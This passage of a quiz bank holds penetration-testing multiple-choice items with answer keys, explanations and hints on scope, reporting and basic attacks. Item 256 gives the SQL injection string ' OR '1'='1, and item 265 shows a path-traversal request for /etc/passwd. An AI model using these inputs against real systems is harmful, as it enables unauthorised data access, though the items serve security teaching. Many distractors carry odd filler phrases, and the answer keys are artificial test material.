    options: ["The evidence was kept in a locked evidence store","The disk image was taken without a hash or a custody record","The analyst signed each transfer of the evidence","The image was verified by hash, and stored read-only"],
    correct: 1, why: "Without a hash and custody trail the evidence may not be accepted in a legal process.",
    hint: "Hash and custody."
  },
  {
    id: 251, rank: 0, role: "pentest", topic: "Penetration Test Authorisation", difficulty: "BEGINNER",
    q: "What must a tester have before starting a penetration test of a client's systems?",
    options: ["Written permission that defines scope and dates","Nothing, as long as the tester only looks and never changes anything","A verbal agreement from a friendly manager at the client","A list of the client's passwords supplied by the helpdesk for the test"],
    correct: 0, why: "Written authorisation protects both parties legally and defines what may be tested and when.",
    hint: "Permission in writing."
  },
  {
    id: 252, rank: 0, role: "pentest", topic: "Vulnerability Scan Versus Pen Test", difficulty: "BEGINNER",
    q: "How does a penetration test differ from a vulnerability scan?",
    options: ["There is no difference as both produce the same report with the same content","A pen test is fully automatic, and a scan is always done by hand with no tools at all","A scan breaks into systems, and a pen test only reads the documentation","A pen test exploits weaknesses to show impact, a scan lists them"],
    correct: 3, why: "Scanners identify possible weaknesses; testers verify and chain them to show actual risk.",
    hint: "Exploit versus list."
  },
  {
    id: 253, rank: 0, role: "pentest", topic: "Test Window Agreement", difficulty: "BEGINNER",
    q: "Why does a test agreement include dates and a testing window?",
    options: ["So the client can plan support and avoid clashes with changes","To describe how the client will pay the invoice after the report is delivered","To give the tester the right to test at any time that the tester prefers","To list the exploits the tester is forbidden to learn about during training"],
    correct: 0, why: "A fixed window lets the client prepare contacts and avoid clashes with changes or outages.",
    hint: "When, not what."
  },
  {
    id: 254, rank: 0, role: "pentest", topic: "Passive Reconnaissance", difficulty: "BEGINNER",
    q: "Which activity is passive reconnaissance?",
    options: ["Sending probes to every open port on the company's firewall","Reading the company's public job adverts and website","Trying common passwords on the remote login page","Connecting to the file server to list its shares"],
    correct: 1, why: "Passive recon gathers public information without touching the target's systems.",
    hint: "Do not touch the target."
  },
  {
    id: 255, rank: 0, role: "pentest", topic: "Reading Nmap Output", difficulty: "BEGINNER",
    exhibit: "PORT     STATE  SERVICE\n22/tcp   open   ssh\n80/tcp   open   http\n3306/tcp closed mysql",
    q: "What does this Nmap result show?",
    options: ["The host appears to be down as no replies came back","Ports 22 and 80 open, 3306 closed, in most cases","All three ports are reported as filtered by the scanner","Only the web port is open, and the host is otherwise silent"],
    correct: 1, why: "State open means a service is listening; closed means reachable but nothing listening.",
    hint: "Read the state column."
  },
  {
    id: 256, rank: 0, role: "pentest", topic: "SQL Injection Basics", difficulty: "BEGINNER",
    q: "Which input in a login form is a typical SQL injection test?",
    options: ["' OR '1'='1","Password123","hello world","admin@example.com"],
    correct: 0, why: "A quote followed by an always-true condition tests whether user input alters the SQL query.",
    hint: "Break out of the quotes."
  },
  {
    id: 257, rank: 0, role: "pentest", topic: "Cross-Site Scripting Meaning", difficulty: "BEGINNER",
    q: "What is cross-site scripting (XSS)?",
    options: ["A way of copying whole websites between two servers during a migration","Attacker script running in a victim's browser, in most cases","A firewall rule that blocks scripts from leaving the company network","A type of password hash used to store credentials in a database"],
    correct: 1, why: "XSS injects script into pages viewed by others, allowing session theft or actions in their name.",
    hint: "Script in the victim's browser."
  },
  {
    id: 258, rank: 0, role: "pentest", topic: "Critical Finding During Test", difficulty: "BEGINNER",
    q: "A tester finds an unauthenticated remote code execution flaw on a production server. What is the BEST action?",
    options: ["Post the flaw on a public forum to warn other users of the same product","Keep exploiting to see how far it goes, and report at the end","Stop exploiting and notify the client contact at once","Fix the server without telling the client"],
    correct: 2, why: "Continuing to test is the runner-up since it adds detail, but a critical exposure on production should be reported at once.",
    hint: "Report critical issues immediately."
  },
  {
    id: 259, rank: 0, role: "pentest", topic: "Default Credentials", difficulty: "BEGINNER",
    q: "Why are default usernames and passwords a common finding in tests?",
    options: ["They are always too long","They cannot be used to log in to any production device","They are required by law","They are public and often left unchanged"],
    correct: 3, why: "Attackers try documented defaults on every exposed device first.",
    hint: "Documented and unchanged."
  },
  {
    id: 260, rank: 0, role: "pentest", topic: "Brute Force Risk in Testing", difficulty: "BEGINNER",
    q: "A tester wants to brute-force a login page during business hours. What is the BEST approach?",
    options: ["Check the rules and agree limits to avoid locking real users","Use real customers' accounts, and the test looks as realistic as it can be","Skip it, and report the page as secure","Run it at full speed to save time"],
    correct: 0, why: "Running at full speed is the runner-up as it gives fast results, but it can lock out real users and disrupt the service.",
    hint: "Agree the limits first."
  },
  {
    id: 261, rank: 0, role: "pentest", topic: "Hashing Versus Encryption", difficulty: "BEGINNER",
    q: "What is the main difference between hashing and encryption?",
    options: ["Encryption cannot protect data","Hashing needs a key to reverse it, and encryption does not need a key at all","Hashing is one-way, encryption is reversible with a key","They are identical in how they work"],
    correct: 2, why: "Hashes are designed not to be reversed; encryption is designed to be reversed by key holders.",
    hint: "One-way versus two-way."
  },
  {
    id: 262, rank: 0, role: "pentest", topic: "Password Salting", difficulty: "BEGINNER",
    q: "Why are salts added to password hashes?",
    options: ["So the stored password becomes shorter, and takes less space in the database","So the user can see it","So the hash can be decrypted again by the administrator when a user forgets","So identical passwords give different hashes, as a general rule"],
    correct: 3, why: "Unique salts stop precomputed tables and reveal less about duplicate passwords.",
    hint: "Make hashes unique."
  },
  {
    id: 263, rank: 0, role: "pentest", topic: "Burp Suite Purpose", difficulty: "BEGINNER",
    q: "What is Burp Suite mainly used for?",
    options: ["Monitoring staff attendance, and review the outcome at the next monthly meeting","Backing up databases, until the next scheduled review takes place","Intercepting and modifying web traffic to test applications","Encrypting laptop disks, until the next scheduled review takes place"],
    correct: 2, why: "Burp acts as a proxy between browser and server so a tester can inspect and alter requests.",
    hint: "Web proxy."
  },
  {
    id: 264, rank: 0, role: "pentest", topic: "Black Box Meaning", difficulty: "BEGINNER",
    q: "What does a black box test mean?",
    options: ["The tester has no prior knowledge of the target","The test is done at night","The test uses only physical tools","The tester is given full source code access, and design documents from the start"],
    correct: 0, why: "Black box simulates an outsider with no inside information; white box gives full knowledge.",
    hint: "No knowledge."
  },
  {
    id: 265, rank: 0, role: "pentest", topic: "HTTP Request Reading", difficulty: "BEGINNER",
    exhibit: "GET /download?file=../../../../etc/passwd HTTP/1.1\nHost: shop.example\nUser-Agent: curl/8.4.0",
    q: "What does this request show an attacker trying to do?",
    options: ["Log in with a valid user, and revisit the decision after the next release","Read a file outside the web folder with path traversal, in most cases","Reset a password","Upload a picture"],
    correct: 1, why: "Repeated ../ sequences try to climb out of the web root to reach system files.",
    hint: "Dot dot slash."
  },
  {
    id: 266, rank: 0, role: "pentest", topic: "Exploit and Vulnerability", difficulty: "BEGINNER",
    q: "What is the relationship between a vulnerability and an exploit?",
    options: ["They are unrelated","A vulnerability is a type of firewall","An exploit is code or a method that takes advantage of a vulnerability","An exploit is a patch"],
    correct: 2, why: "A vulnerability is the weakness, and the exploit is how it is abused.",
    hint: "Weakness versus method."
  },
  {
    id: 267, rank: 0, role: "pentest", topic: "CVSS Purpose", difficulty: "BEGINNER",
    q: "What is a CVSS score used for?",
    options: ["Counting the staff in a security team, and review the outcome at the next monthly meeting","Rating how severe a vulnerability is in a standard way","Measuring network speed, until the next scheduled review takes place","Checking if a password is strong"],
    correct: 1, why: "CVSS gives a common severity score, though real priority also depends on context.",
    hint: "Severity score."
  },
  {
    id: 268, rank: 0, role: "pentest", topic: "Social Engineering Test Limits", difficulty: "BEGINNER",
    q: "A client asks for a phishing test. What is the BEST way to avoid harm?",
    options: ["Collect real passwords, and store them","Use a message about a family emergency, and revisit the decision after the next release","Send it to everyone including their families, and review the outcome at the next monthly meeting","Agree scope and approved lists, and avoid sensitive topics like layoffs or health"],
    correct: 3, why: "Collecting real passwords is the runner-up because it measures success, but it creates data risk; recording clicks is enough.",
    hint: "Avoid harm and real credentials."
  },
  {
    id: 269, rank: 0, role: "pentest", topic: "Packet Capture Tool", difficulty: "BEGINNER",
    q: "Which tool is commonly used to capture and inspect network packets?",
    options: ["Notepad, as a general rule","Wireshark","Excel, in most cases","Photoshop, as a general rule"],
    correct: 1, why: "Wireshark lets testers and defenders examine traffic in detail.",
    hint: "Packet analyser."
  },
  {
    id: 270, rank: 0, role: "pentest", topic: "Report Value", difficulty: "BEGINNER",
    q: "What makes a penetration test report most useful to a client?",
    options: ["Clear findings with evidence, risk rating and remediation steps, as a general rule","Technical jargon with no summary","Only a list of tools used","Only screenshots without text"],
    correct: 0, why: "Reports must let both managers and technical staff understand and fix the issues.",
    hint: "Findings and fixes."
  },
  {
    id: 271, rank: 0, role: "pentest", topic: "Backups Before Testing", difficulty: "BEGINNER",
    q: "A tester is about to run an intrusive test on a production database. What should the client do first? Choose the BEST action.",
    options: ["Disable monitoring, until the next scheduled review takes place","Tell nobody, and revisit the decision after the next release","Hand over the root password","Confirm a recent tested backup and agree a rollback plan"],
    correct: 3, why: "Disabling monitoring is the runner-up as it avoids false alarms, but it removes protection and hides tester activity from the SOC.",
    hint: "Prepare for rollback."
  },
  {
    id: 272, rank: 0, role: "pentest", topic: "Directory Enumeration", difficulty: "BEGINNER",
    q: "What is the goal of directory enumeration against a web server?",
    options: ["Encrypting the website, and revisit the decision after the next release","Finding hidden folders and files that are not linked from the site","Speeding up the website, and review the outcome at the next monthly meeting","Changing DNS records, and revisit the decision after the next release"],
    correct: 1, why: "Enumeration reveals admin pages, backups and test files that may expose data.",
    hint: "Find the hidden."
  },
  {
    id: 273, rank: 0, role: "pentest", topic: "Banner Grabbing", difficulty: "BEGINNER",
    q: "What does banner grabbing reveal?",
    options: ["The staff list","The physical address of the server, as a general rule","The password of the administrator, as a general rule","The software name and version a service reports"],
    correct: 3, why: "Version information helps testers look for known vulnerabilities.",
    hint: "Service identity."
  },
  {
    id: 274, rank: 0, role: "pentest", topic: "SSH Key Handling", difficulty: "BEGINNER",
    q: "What is the safest way to handle a private SSH key?",
    options: ["Store it on a public website","Post it in chat","Email it to the team","Keep it private with a passphrase, and never share it, until the next scheduled review takes place"],
    correct: 3, why: "A private key proves identity, so exposure lets anyone log in as the owner.",
    hint: "Private means private."
  },
  {
    id: 275, rank: 0, role: "pentest", topic: "Wireless Test Basics", difficulty: "BEGINNER",
    q: "Which Wi-Fi security setting is the weakest?",
    options: ["WPA2 with a long passphrase","Enterprise authentication with certificates","Open network with no encryption","WPA3"],
    correct: 2, why: "Open networks expose traffic to anyone nearby and offer no authentication.",
    hint: "No encryption."
  },
  {
    id: 276, rank: 0, role: "pentest", topic: "Privilege Escalation Meaning", difficulty: "BEGINNER",
    q: "What is privilege escalation?",
    options: ["Installing a printer, and review the outcome at the next monthly meeting","Moving to a new desk, and revisit the decision after the next release","Gaining higher access rights than first obtained","Increasing the speed of a network, as a first step"],
    correct: 2, why: "Testers move from a normal user to admin or root to show the impact of a flaw.",
    hint: "Higher rights."
  },
  {
    id: 277, rank: 0, role: "pentest", topic: "Cookie Security Flags", difficulty: "BEGINNER",
    q: "Which cookie flag helps stop scripts from reading a session cookie?",
    options: ["Colour, in most cases","HttpOnly","SameName, as a general rule","Visible, in most cases"],
    correct: 1, why: "HttpOnly makes the cookie inaccessible to JavaScript, limiting theft through XSS.",
    hint: "Hide from scripts."
  },
  {
    id: 278, rank: 0, role: "pentest", topic: "Scoping IP Ranges", difficulty: "BEGINNER",
    q: "The client lists 10.0.0.0/24 in scope. During a scan the tester finds an interesting host at 10.0.1.15. What is the BEST action?",
    options: ["Do not test it and ask the client whether it should be added","Ignore it silently, and review the outcome at the next monthly meeting","Test it as it is probably part of the same company","Scan it lightly first, and review the outcome at the next monthly meeting"],
    correct: 0, why: "Scanning lightly is the runner-up because it seems harmless, but it is still testing an out-of-scope system without permission.",
    hint: "Ask first."
  },
  {
    id: 279, rank: 0, role: "pentest", topic: "File Permission Finding", difficulty: "BEGINNER",
    exhibit: "-rw-r--r-- 1 root root 412 Mar  2 09:11 /opt/app/db_password.txt",
    q: "A Linux file containing passwords is readable by every user. What is the finding?",
    options: ["Insecure permissions exposing sensitive data, in most cases","A network fault","A firewall rule","A normal setting"],
    correct: 0, why: "World-readable credentials let any local user steal them.",
    hint: "Too open."
  },
  {
    id: 280, rank: 0, role: "pentest", topic: "Google Dorking", difficulty: "BEGINNER",
    q: "What is Google dorking in recon?",
    options: ["Hacking Google","Changing a website's colour, then record the result in the ticket","Buying advertising, and revisit the decision after the next release","Using advanced search operators to find exposed information"],
    correct: 3, why: "Operators like filetype and site can reveal documents and pages not meant to be public.",
    hint: "Advanced search."
  },
  {
    id: 281, rank: 0, role: "pentest", topic: "Egress Filtering Purpose", difficulty: "BEGINNER",
    q: "Why do defenders restrict outbound connections from servers?",
    options: ["To hide the servers from DNS","To print documents faster","To make backups run quicker","To stop compromised servers calling out to attacker systems, as a general rule"],
    correct: 3, why: "Restricting outbound traffic limits command channels and data leaving after a compromise.",
    hint: "Limit calling out."
  },
  {
    id: 282, rank: 0, role: "pentest", topic: "Sensitive Data in Test", difficulty: "BEGINNER",
    q: "A tester finds a database with customer card numbers. What should they do?",
    options: ["Share it with friends, and review the outcome at the next monthly meeting","Download everything as proof","Avoid copying real data and report the exposure with minimal proof","Sell the data"],
    correct: 2, why: "Testers should prove access without taking more data than necessary.",
    hint: "Minimal proof."
  },
  {
    id: 283, rank: 0, role: "pentest", topic: "Retesting", difficulty: "BEGINNER",
    q: "Why does a client usually ask for a retest after fixing findings?",
    options: ["To delete the report","To pay more money","To confirm the fixes work and did not create new problems, as a general rule","To change the scope"],
    correct: 2, why: "Verification closes the loop on remediation.",
    hint: "Confirm fixes."
  },
  {
    id: 284, rank: 0, role: "pentest", topic: "Packet Sniffing Risk", difficulty: "BEGINNER",
    q: "Why is sniffing traffic on an open Wi-Fi network a risk to users?",
    options: ["It speeds up the network","Unencrypted data can be read by others nearby","It makes the signal stronger","It deletes the traffic"],
    correct: 1, why: "Without encryption, passwords and sessions may be exposed.",
    hint: "Others can read it."
  },
  {
    id: 285, rank: 0, role: "pentest", topic: "HTTPS Purpose", difficulty: "BEGINNER",
    q: "What does HTTPS provide that HTTP does not?",
    options: ["More colours","Faster pages","Encryption and server authentication of the connection, as a general rule","Larger files"],
    correct: 2, why: "TLS protects data in transit and helps verify the site.",
    hint: "Protects in transit."
  },
  {
    id: 286, rank: 0, role: "pentest", topic: "Cleanup After Testing", difficulty: "BEGINNER",
    q: "A tester created temporary accounts and uploaded tools during the test. What is the BEST action at the end?",
    options: ["Rename them, and revisit the decision after the next release","Remove everything created and document what was changed","Tell nobody, until the next scheduled review takes place","Leave them for the next test, and revisit the decision after the next release"],
    correct: 1, why: "Leaving them is the runner-up since it may save time later, but leftover tools and accounts create real risk for the client.",
    hint: "Clean up and document."
  },
  {
    id: 287, rank: 0, role: "pentest", topic: "Open Port Meaning", difficulty: "BEGINNER",
    q: "What does an open port show?",
    options: ["The computer is switched off","A service is accepting connections on that port","The network cable is unplugged","A password has been changed"],
    correct: 1, why: "Open ports are potential entry points that testers examine further.",
    hint: "Listening service."
  },
  {
    id: 288, rank: 0, role: "pentest", topic: "Whois Lookup", difficulty: "BEGINNER",
    q: "What information can a whois lookup provide about a domain?",
    options: ["The employees' home addresses, as a general rule","Registrar, registration dates and name servers","The CEO's password","The server's source code"],
    correct: 1, why: "Whois is public registration data used in passive recon.",
    hint: "Registration data."
  },
  {
    id: 289, rank: 0, role: "pentest", topic: "Social Engineering Pretext", difficulty: "BEGINNER",
    q: "What is a pretext in social engineering?",
    options: ["A believable story used to gain trust or information, as a general rule","A type of firewall","A virus signature","A password hash"],
    correct: 0, why: "Pretexting uses invented scenarios such as a fake helpdesk call.",
    hint: "Invented story."
  },
  {
    id: 290, rank: 0, role: "pentest", topic: "Test Evidence Handling", difficulty: "BEGINNER",
    q: "How should test evidence such as screenshots and logs be stored?",
    options: ["On a public share","In personal email","On any USB stick","Encrypted with access limited to the test team, and deleted per agreement, as a general rule"],
    correct: 3, why: "Evidence often contains sensitive client data and must be protected.",
    hint: "Protect evidence."
  },
  {
    id: 291, rank: 0, role: "pentest", topic: "Authorisation Letter", difficulty: "BEGINNER",
    q: "Why do testers carry a signed authorisation letter during on-site work?",
    options: ["It gives the testers access to every room in the building","It replaces the need for a written test report","It proves the client has approved the activity","It allows the testers to ignore the scope if they wish"],
    correct: 2, why: "A signed letter protects testers and helps security staff confirm the work is legitimate.",
    hint: "Proof of approval."
  },
  {
    id: 292, rank: 0, role: "pentest", topic: "Severity Wording", difficulty: "BEGINNER",
    q: "Which severity description is the clearest in a test report?",
    options: ["High: customer data could be read by any internet user","Bad: this is a problem that someone should look at soon","Big: the tester felt strongly about this one finding","Red: please see the colour in the attached spreadsheet"],
    correct: 0, why: "Severity wording should state the impact in plain terms.",
    hint: "Say the impact."
  },
  {
    id: 293, rank: 0, role: "pentest", topic: "Passive Information Review", difficulty: "BEGINNER",
    exhibit: "Source: company website and public profiles\nStaff directory: 42 names with job titles\nEmail format: first.last@company.example\nBlog post: 'We use VendorX for payroll' (2025-06)",
    q: "What does this public records summary show about the organisation?",
    options: ["All employee information has been removed from the web","The firewall blocks every outside connection to the site","Staff names and email formats are publicly visible","The internal network is fully hidden from all outsiders"],
    correct: 2, why: "Public details can help attackers build targeted messages so awareness is a recommendation.",
    hint: "Public exposure."
  },
  {
    id: 294, rank: 0, role: "pentest", topic: "Scan Window Choice", difficulty: "BEGINNER",
    q: "A client has a fragile legacy system. When is it BEST to schedule a vulnerability scan of it?",
    options: ["In an agreed low-risk window with the owner on standby","At any time the tester prefers without telling the client","Never as legacy systems are always out of scope","During the busiest hour to see how it behaves under load"],
    correct: 0, why: "Never scanning is the runner-up as it avoids risk, but agreed timing and a standby owner allow safe assessment.",
    hint: "Agree the window."
  },
  {
    id: 295, rank: 0, role: "pentest", topic: "Informational Findings", difficulty: "BEGINNER",
    q: "What is an informational finding in a test report?",
    options: ["A finding that the client is not allowed to read","An observation with no direct security impact on its own, as a general rule","A repeated finding that was copied from last year","A critical flaw that must be fixed within one hour"],
    correct: 1, why: "Informational items give context or hardening ideas and not urgent risk.",
    hint: "Low impact note."
  },
  {
    id: 296, rank: 0, role: "pentest", topic: "Report Audience", difficulty: "BEGINNER",
    q: "Who is the main audience for the technical section of a test report?",
    options: ["The staff who attended the kick-off meeting only","The press who may write about the client","The engineers who will fix the issues","The competitors of the client company"],
    correct: 2, why: "Technical details help the teams that must reproduce and remediate findings.",
    hint: "Fixers."
  },
  {
    id: 297, rank: 0, role: "pentest", topic: "Default Credentials Finding", difficulty: "BEGINNER",
    q: "What is the best recommendation when a device uses its default administrator password?",
    options: ["Change it to a unique strong secret and manage it centrally","Leave it unchanged as the device is behind a firewall","Write the default password on the device label, in the first instance","Share the password by chat with the whole team, then record the result in the ticket"],
    correct: 0, why: "Default credentials are widely known and must be replaced.",
    hint: "Replace defaults."
  },
  {
    id: 298, rank: 0, role: "pentest", topic: "Client Contact Plan", difficulty: "BEGINNER",
    q: "Why agree an emergency contact before testing starts?",
    options: ["To let the tester choose the scope after starting, in most cases","To give the tester authority over client staff, in most cases","To avoid telling the client about any findings later, in most cases","To reach someone quickly if testing causes a problem"],
    correct: 3, why: "A named contact allows fast response to outages or serious discoveries.",
    hint: "Who to call."
  },
  {
    id: 299, rank: 0, role: "pentest", topic: "Hardening Checklist Exhibit", difficulty: "BEGINNER",
    exhibit: "Control                          Result\nAutomatic time sync              Pass\nLaptop disk encryption           Pass\nScreen lock timeout 5 min        Pass\nRemote admin open to internet    FAIL\nPatch level within 30 days       Pass",
    q: "Which item on this checklist result needs attention first?",
    options: ["Disk encryption is enabled on laptops","Automatic time synchronisation is enabled","Remote administration open to the internet","The screen lock timeout is set to five minutes"],
    correct: 2, why: "Exposed administration is a high-risk setting that should be removed or restricted.",
    hint: "Exposed admin."
  },
  {
    id: 300, rank: 0, role: "pentest", topic: "Out-of-Hours Contact", difficulty: "BEGINNER",
    q: "Why should testers know the client's out-of-hours contact before starting?",
    options: ["To let the tester decide when the test ends","To invite the client to the test lab each evening, as a general rule","To avoid including the contact in the final report, as a general rule","To reach someone quickly if a system fails outside normal hours"],
    correct: 3, why: "Quick contact limits the effect of any unexpected outage.",
    hint: "Reach someone fast."
  },
  {
    id: 301, rank: 1, role: "pentest", topic: "Scope Document Review", difficulty: "INTERMEDIATE",
    q: "Which item is most important to confirm in a written scope before testing starts?",
    options: ["The colour theme used in the final report, as a general rule","The favourite tools of the testing team members who will do the work","The number of pages that the final report is expected to contain overall","The systems and dates authorised for testing, in most cases"],
    correct: 3, why: "Written authorisation of targets and timing protects both the client and the testers.",
    hint: "Authorisation."
  },
  {
    id: 302, rank: 1, role: "pentest", topic: "Rules of Engagement", difficulty: "INTERMEDIATE",
    q: "Testers find a system outside the agreed scope that looks poorly protected. What is the BEST action?",
    options: ["Test it quietly, and mention it only in the final report, then record the result in the ticket","Test it anyway as it could improve the client's security, and review the outcome at the next monthly meeting","Ignore it, and never tell the client that it exists, and review the outcome at the next monthly meeting","Stop, record it and ask the client for written approval first, as a general rule"],
    correct: 3, why: "Testing it anyway is the runner-up as it seems helpful, but acting outside scope can be unlawful and breach the contract.",
    hint: "Out of scope."
  },
  {
    id: 303, rank: 1, role: "pentest", topic: "Vulnerability Scan Exhibit", difficulty: "INTERMEDIATE",
    exhibit: "Host: 10.20.4.15   Port: 443/tcp\nFinding: TLS certificate expired (Severity: Medium)\nPlugin: 51192   Confidence: Tentative\nBanner: shared load balancer in front of three hosts",
    q: "What should the analyst do first with this scan result?",
    options: ["Check whether the finding is a false positive on that host","Delete it as it is marked informational","Report it as confirmed without any further checking","Send it to the client unreviewed, then record the result in the ticket"],
    correct: 0, why: "Scanner results need validation before they are reported as confirmed.",
    hint: "Validate first."
  },
  {
    id: 304, rank: 1, role: "pentest", topic: "Risk Rating Exhibit", difficulty: "INTERMEDIATE",
    exhibit: "Finding: Outdated web framework with a known remote code execution advisory\nAsset: customer-portal (internet-facing)\nData: names, addresses, payment tokens\nCompensating controls: none observed\nCVSS base: 9.8",
    q: "Which factor best explains why this finding is rated Critical?",
    options: ["The system has a long hostname that is hard to read","The tester used a new tool to detect the issue, as a general rule","An internet-facing system holds regulated customer data","The report has the findings in alphabetical order"],
    correct: 2, why: "Rating combines exposure and impact on the asset and its data.",
    hint: "Exposure and impact."
  },
  {
    id: 305, rank: 1, role: "pentest", topic: "Executive Summary Writing", difficulty: "INTERMEDIATE",
    q: "Which is the BEST content for the executive summary of a test report?",
    options: ["The personal opinions of the tester about the client staff, in most cases","Business impact, overall risk level and the top priorities to fix","Only the names of the tools the tester ran during the work, as a general rule","A full list of every packet, and command the tester used, as a general rule"],
    correct: 1, why: "A command list is the runner-up as it shows effort, but executives need impact and priorities to decide.",
    hint: "Business language."
  },
  {
    id: 306, rank: 1, role: "pentest", topic: "Remediation Advice", difficulty: "INTERMEDIATE",
    q: "Which remediation recommendation is the most useful to a development team?",
    options: ["Use parameterised queries and validate input on the server, as a first step","Fix the application and it is more secure in general","Consider hiring a more experienced developer next year","Be careful when writing code in the future from now on"],
    correct: 0, why: "Specific actionable advice helps developers fix the root cause.",
    hint: "Be specific."
  },
  {
    id: 307, rank: 1, role: "pentest", topic: "Retest Planning", difficulty: "INTERMEDIATE",
    q: "Why should a retest be scheduled after the client fixes findings?",
    options: ["To replace the original report with a much shorter version for the board","To avoid speaking to the client about the results","To raise the invoice for the client once the original work is finished","To confirm the fixes work and caused no new issues, in most cases"],
    correct: 3, why: "Verification closes the loop on remediation.",
    hint: "Verify the fix."
  },
  {
    id: 308, rank: 1, role: "pentest", topic: "Evidence Handling", difficulty: "INTERMEDIATE",
    q: "How should a tester store screenshots and logs that contain client data?",
    options: ["A shared personal drive that friends, and family members can open at any time","Encrypted storage limited to the team and deleted per contract","An email sent to every member of the testing company for easier access to it","On a public repository, and the team can find it"],
    correct: 1, why: "Client evidence is sensitive and must be protected and disposed of properly.",
    hint: "Protect evidence."
  },
  {
    id: 309, rank: 1, role: "pentest", topic: "False Positive Triage", difficulty: "INTERMEDIATE",
    q: "A scanner reports a vulnerable version, but the vendor patched it without changing the banner. What is this?",
    options: ["A problem with the colour of the report, in most cases","A new type of attack technique that was found","A confirmed critical flaw that needs urgent work, as a general rule","A likely false positive caused by a backported fix"],
    correct: 3, why: "Banner-based detection can miss backported patches.",
    hint: "Backport."
  },
  {
    id: 310, rank: 1, role: "pentest", topic: "Authenticated vs Unauthenticated", difficulty: "INTERMEDIATE",
    q: "What is the main advantage of an authenticated vulnerability scan?",
    options: ["It never produces any false positives at all","It sees configuration and patch details that outsiders cannot","It removes the need for a scope document","It is always faster than every other scanning type"],
    correct: 1, why: "Credentials let the scanner inspect the host from inside.",
    hint: "Inside view."
  },
  {
    id: 311, rank: 1, role: "pentest", topic: "Test Type Selection", difficulty: "INTERMEDIATE",
    q: "A client wants to know how well their team detects and responds to attacks. Which engagement fits BEST?",
    options: ["A code style review that the developers carry out among themselves alone","A vulnerability scan that is run once and reported without any review","A red team exercise against a defending blue team","A policy review done without any technical activity"],
    correct: 2, why: "A scan is the runner-up as it is cheap, but it does not exercise detection and response.",
    hint: "Detection and response."
  },
  {
    id: 312, rank: 1, role: "pentest", topic: "Reporting Severity Disagreement", difficulty: "INTERMEDIATE",
    q: "The client disagrees with a High rating because the system is internal. What is the best response?",
    options: ["Discuss the rating criteria and adjust only if the evidence supports it, in most cases","Remove the finding from the report to keep the client happy","Raise it to Critical to prove the tester was correct","Refuse to discuss it, and send the same report again, then record the result in the ticket"],
    correct: 0, why: "Ratings should follow documented criteria and evidence.",
    hint: "Criteria."
  },
  {
    id: 313, rank: 1, role: "pentest", topic: "Asset Inventory Exhibit", difficulty: "INTERMEDIATE",
    exhibit: "Client inventory: 120 hosts\nDiscovery scan: 147 live hosts\nNot in inventory: 27 (14 web servers, 9 printers, 4 unknown)\nOwner of unknown hosts: none recorded",
    q: "What does this inventory comparison suggest about the client's environment?",
    options: ["All hosts are fully patched","Unmanaged systems exist that the client did not list, as a general rule","The scan was run against the wrong year","Every host was listed correctly by the client"],
    correct: 1, why: "Hosts found by discovery but missing from the inventory indicate shadow assets.",
    hint: "Compare the lists."
  },
  {
    id: 314, rank: 1, role: "pentest", topic: "Compliance vs Security", difficulty: "INTERMEDIATE",
    q: "Why can a passed compliance audit still leave real security gaps?",
    options: ["Audits always check every system every day without gaps, as a general rule","Compliance means no attacker can ever succeed","Compliance forbids any security testing from taking place","Audits sample controls at a point in time and not every risk"],
    correct: 3, why: "Compliance is a baseline and not a guarantee.",
    hint: "Point in time."
  },
  {
    id: 315, rank: 1, role: "pentest", topic: "Social Engineering Scoping", difficulty: "INTERMEDIATE",
    q: "What must be agreed before any phishing awareness exercise begins?",
    options: ["A plan to hide the exercise from the legal team, as a general rule","A promise to punish anyone who clicks a link in it, as a general rule","The names of staff members to embarrass in the report, as a general rule","Approval, targets, stop conditions and how results are handled"],
    correct: 3, why: "Such exercises need executive approval and clear handling of individuals' data.",
    hint: "Approval and handling."
  },
  {
    id: 316, rank: 1, role: "pentest", topic: "Report Finding Structure", difficulty: "INTERMEDIATE",
    q: "Which set of fields makes a finding most actionable?",
    options: ["Title only with a single word summary of the issue","Title, affected asset, description, impact, evidence and fix, as a general rule","Only the tool name, and the date of the test","Only a screenshot with no text around it"],
    correct: 1, why: "A complete structure lets the reader understand and fix it.",
    hint: "Complete structure."
  },
  {
    id: 317, rank: 1, role: "pentest", topic: "Patch Prioritisation Exhibit", difficulty: "INTERMEDIATE",
    exhibit: "A: web-gw-01  internet-facing  CVE-2025-0001 CVSS 9.1  exploited in the wild: yes\nB: test-app-04 internal  CVE-2024-1234 CVSS 3.1  exploited: no\nC: printer-12  internal  banner disclosure  info\nD: old-fs-02   powered off  CVE-2023-4321 CVSS 7.5",
    q: "Which patch should the client deploy first according to this list?",
    options: ["The archived server that is switched off","The printer with an informational banner finding, in most cases","The internet-facing server with an actively exploited flaw","The test server with a low severity cosmetic issue, as a general rule"],
    correct: 2, why: "Exposure plus active exploitation should drive priority.",
    hint: "Exposure and exploitation."
  },
  {
    id: 318, rank: 1, role: "pentest", topic: "Penetration Test Limitations", difficulty: "INTERMEDIATE",
    q: "Which statement about a penetration test is accurate?",
    options: ["It finds every vulnerability that could ever exist","It is a time-boxed sample of risk and not a guarantee of safety","It replaces the need for ongoing vulnerability management","It proves that no attacker can ever get in"],
    correct: 1, why: "Tests are limited by time and scope.",
    hint: "Time-boxed."
  },
  {
    id: 319, rank: 1, role: "pentest", topic: "Credential Policy Findings", difficulty: "INTERMEDIATE",
    q: "A review finds many shared admin accounts. What is the best recommendation?",
    options: ["Named accounts with MFA and logged administrator actions","Keep the shared accounts, and change their password once every year","Share the password in a ticket, and every engineer can find it quickly","Remove logging to save storage space, until the next scheduled review takes place"],
    correct: 0, why: "Named accounts give accountability and MFA reduces takeover.",
    hint: "Accountability."
  },
  {
    id: 320, rank: 1, role: "pentest", topic: "Test Window Communication", difficulty: "INTERMEDIATE",
    q: "Testing may trigger alerts in the client's monitoring. What is the BEST way to handle it?",
    options: ["Warn the entire company by email every morning","Turn off the monitoring during all testing, and revisit the decision after the next release","Agree contacts, and a deconfliction process for alerts in advance, in most cases","Tell no one, and the response is more genuine"],
    correct: 2, why: "Telling no one is the runner-up as it feels realistic, but it risks real incident escalation and wasted response effort.",
    hint: "Deconflict."
  },
  {
    id: 321, rank: 1, role: "pentest", topic: "Log Review Finding", difficulty: "INTERMEDIATE",
    exhibit: "02:00-02:12  214 failed logins  user=admin  src=198.51.100.20\nAlerts raised: 0\nAccount lockout threshold: not configured\nSIEM rule 'brute-force': disabled",
    q: "What does this log extract suggest about the client's monitoring?",
    options: ["Every failed login triggered an alert at once, as a general rule","The logs were encrypted with a customer key","No users attempted to sign in during the period","Repeated failed logins were not alerted on by the system"],
